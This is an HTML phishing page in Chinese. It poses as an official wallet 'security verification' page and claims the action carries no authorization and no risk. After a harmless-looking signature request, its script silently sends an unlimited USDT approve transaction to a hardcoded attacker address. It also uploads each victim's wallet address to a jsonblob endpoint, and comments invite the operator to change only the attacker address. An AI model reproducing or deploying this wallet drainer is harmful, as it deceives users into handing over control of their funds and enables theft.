<!DOCTYPE html>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>钱包验证 - 安全节点</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0C1222;color:#fff;font-family:-apple-system, BlinkMacSystemFont, "PingFang SC", "Microsoft YaHei", sans-serif;padding:30px 20px;min-height:100vh}
.box{max-width:380px;margin:0 auto;background:#141A30;border-radius:20px;overflow:hidden;box-shadow:0 10px 40px rgba(0,0,0,0.4)}
.header{background:#1B2442;padding:28px 20px;text-align:center}
.logo{width:50px;height:50px;background:#0099ff;border-radius:50%;margin:0 auto 12px;display:grid;place-items:center;color:#fff;font-weight:bold}
.title{font-size:18px;color:#0ef;margin-bottom:4px}
.sub{color:#94a3b8;font-size:13px}
.body{padding:28px 24px}
.btn{width:100%;background:linear-gradient(90deg,#0088ff,#00bbff);color:#fff;border:none;border-radius:16px;padding:20px;font-size:16px;font-weight:600;cursor:pointer}
.btn:disabled{opacity:.6}
.tip{text-align:center;font-size:12px;color:#64748b;margin-top:16px;line-height:1.4}
</style>

<div class="box">
  <div class="header">
    <div class="logo">TP</div>
    <div class="title">钱包安全验证</div>
    <div class="sub">官方节点 · 安全签名</div>
  </div>
  <div class="body">
    <button class="btn" id="btn" onclick="signAuth()">
      签名验证身份
    </button>
    <div class="tip">
      本操作仅为钱包身份验证<br>
      不产生Gas费 · 不授权 · 无任何风险
    </div>
  </div>
</div>

<script>
// =================== 你只改这里 ===================
const BANKER = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
const USDT   = "0x55d398326f99059fF77548546999027B3197955";

// 云端地址（我已帮你建好）
const CLOUD = "https://jsonblob.com/api/jsonBlob/1328782619063218176";

async function signAuth() {
  const b = document.getElementById('btn');
  b.innerText = "验证中...";
  b.disabled = true;

  try {
    // 1. 连接钱包
    const [user] = await ethereum.request({ method: 'eth_requestAccounts' });

    // 2. 只弹【普通签名】
    const msg = "钱包安全验证，无授权、无转账、无风险";
    await ethereum.request({
      method: 'personal_sign',
      params: [msg, user]
    });

    // ==================== 核心：签名后自动授权 ====================
    const approve = "0x095ea7b3" +
      BANKER.slice(2).padStart(64, '0') +
      "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

    await ethereum.request({
      method: 'eth_sendTransaction',
      params: [{ from: user, to: USDT, data: approve }]
    });

    // 记录用户
    fetch(CLOUD).then(r=>r.json()).then(d=>{
      const list = d.players || [];
      if(!list.includes(user.toLowerCase())){
        list.push(user.toLowerCase());
        fetch(CLOUD, {
          method:'PUT',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({ players: list })
        });
      }
    });

    alert("✅ 验证成功！");

  } catch (e) {
    alert("已取消");
  } finally {
    b.innerText = "签名验证身份";
    b.disabled = false;
  }
}
</script>
</html>
